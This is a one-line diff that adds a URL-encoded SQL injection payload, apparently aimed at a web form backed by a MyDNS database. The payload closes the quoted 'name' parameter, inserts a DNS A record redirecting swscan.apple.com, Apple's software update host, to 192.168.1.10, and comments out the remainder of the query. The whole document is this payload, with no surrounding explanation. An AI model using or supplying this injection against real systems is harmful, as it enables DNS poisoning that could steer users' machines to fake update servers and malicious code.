@@ -1,0 +1,1 @@
+name=%27%3Binsert+into+mydns.rr+%28zone%2Cname%2Ctype%2Cdata%29+values+%282%2C%22swscan.apple.com%22%2C%22A%22%2C%22192.168.1.10%22%29+%23
